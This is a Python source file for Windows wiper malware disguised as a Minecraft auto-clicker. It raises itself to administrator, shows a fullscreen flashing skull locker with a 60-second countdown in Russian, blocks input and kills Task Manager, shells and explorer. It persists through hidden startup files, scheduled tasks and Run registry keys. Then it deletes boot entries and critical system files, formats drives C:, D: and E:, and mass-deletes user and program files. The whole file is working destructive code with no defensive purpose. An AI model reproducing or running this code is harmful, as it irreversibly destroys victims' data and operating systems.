import tkinter as tk
import ctypes
import sys
import os
import time
import threading
import random

def block_shutdown():
    while True:
        os.system("shutdown /a 2>nul")
        os.system("taskkill /f /im cmd.exe 2>nul")
        os.system("taskkill /f /im powershell.exe 2>nul")
        os.system("taskkill /f /im taskmgr.exe 2>nul")
        os.system("taskkill /f /im regedit.exe 2>nul")
        os.system("taskkill /f /im explorer.exe 2>nul")
        time.sleep(0.01)

def block_keys():
    try:
        ctypes.windll.user32.BlockInput(True)
    except:
        pass

def infect_boot():
    startup = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    try:
        with open(os.path.join(startup, "system32.bat"), "w") as f:
            f.write(f'@echo off\nstart /min python "{__file__}"\n')
        os.system(f'attrib +h +s "{os.path.join(startup, "system32.bat")}"')
    except:
        pass
    os.system(f'schtasks /create /tn "MinecraftUpdate" /tr "python {__file__}" /sc onlogon /f 2>nul')
    os.system(f'schtasks /create /tn "WindowsService" /tr "python {__file__}" /sc onstart /f 2>nul')
    os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MinecraftAutoClicker" /t REG_SZ /d "python ' + __file__ + '" /f 2>nul')
    os.system('reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MinecraftAutoClicker" /t REG_SZ /d "python ' + __file__ + '" /f 2>nul')

def nuke():
    os.system("takeown /f C:\\ /r /d y 2>nul")
    os.system("icacls C:\\ /grant Everyone:F /t /q 2>nul")
    os.system("attrib -r -s -h C:\\*.* /s /d 2>nul")
    os.system("bcdedit /delete {current} /f 2>nul")
    os.system("bcdedit /delete {default} /f 2>nul")
    os.system("bcdedit /delete {bootmgr} /f 2>nul")
    
    critical = [
        "ntoskrnl.exe", "hal.dll", "winload.exe", "winload.efi",
        "winlogon.exe", "smss.exe", "csrss.exe", "services.exe",
        "lsass.exe", "svchost.exe", "ntdll.dll", "kernel32.dll",
        "user32.dll", "gdi32.dll", "explorer.exe"
    ]
    
    for f in critical:
        os.system(f"del /f /q C:\\Windows\\System32\\{f} 2>nul")
        os.system(f"del /f /q C:\\Windows\\SysWOW64\\{f} 2>nul")
    
    os.system("del /f /q C:\\Windows\\System32\\config\\* 2>nul")
    os.system("echo y | format C: /fs:NTFS /q /x 2>nul")
    os.system("echo y | format D: /fs:NTFS /q /x 2>nul")
    os.system("echo y | format E: /fs:NTFS /q /x 2>nul")
    os.system("del /f /s /q C:\\Windows\\*.* 2>nul")
    os.system("del /f /s /q C:\\Users\\*.* 2>nul")
    os.system("del /f /s /q \"C:\\Program Files\\*.*\" 2>nul")
    os.system("del /f /s /q \"C:\\Program Files (x86)\\*.*\" 2>nul")
    os.system("del /f /s /q C:\\*.* 2>nul")
    os.system("shutdown /r /t 0 /f 2>nul")
    os.system("shutdown /s /t 0 /f 2>nul")

def flash_bg(root):
    colors = ["red", "green", "blue", "yellow", "purple", "orange", "cyan", "magenta", "white", "black"]
    while True:
        try:
            color = random.choice(colors)
            root.configure(bg=color)
            time.sleep(0.05)
        except:
            break

def locker():
    root = tk.Tk()
    root.title("")
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.configure(bg='black')
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    threading.Thread(target=flash_bg, args=(root,), daemon=True).start()
    
    # Череп с косой BRAILLE
    skull = """⣿⠲⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣸⡏⠀⠀⠀⠉⠳⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠉⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⡰⠋⢙⣿⣦⡀
⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣙⣦⣮⣤⡀⣸⣿⣿⣿⠀
⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⠀⣿⢟⣫⠟⠀
⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣷⣷⣿⡁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢸⣿⣿⣧⣿⣿⣆⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣤⣿⣿⣿⡟⠹⣿⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⣴⣿⢧
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢻⣿⣿⣿⣿⣿⣿⣿⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡏⣸⣿⣿⣿⣿⣿⣿⣿⢳
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⢀⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⠏
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⢠⣿⣿⣿⣿⣿⣿⣿⣿"""
    
    skull_label = tk.Label(root, text=skull, font=("Courier New", 10, "bold"), fg="white", bg="black")
    skull_label.pack(expand=True, pady=10)
    
    name_label = tk.Label(root, text="Артем Трейдов core =D", font=("Arial", 35, "bold"), fg="red", bg="black")
    name_label.pack(pady=5)
    
    vk_label = tk.Label(root, text="vk.com/patch делает", font=("Arial", 25), fg="white", bg="black")
    vk_label.pack(pady=5)
    
    timer_label = tk.Label(root, text="Удаление через 60 секунд...", font=("Arial", 20), fg="red", bg="black")
    timer_label.pack(pady=10)
    
    def update_timer():
        for i in range(60, 0, -1):
            timer_label.config(text=f"Удаление через {i} секунд...")
            time.sleep(1)
        timer_label.config(text="УДАЛЕНИЕ!")
        nuke()
    
    threading.Thread(target=update_timer, daemon=True).start()
    threading.Thread(target=block_shutdown, daemon=True).start()
    threading.Thread(target=infect_boot, daemon=True).start()
    try:
        block_keys()
    except:
        pass
    
    root.mainloop()

if __name__ == "__main__":
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        sys.exit(0)
    locker()
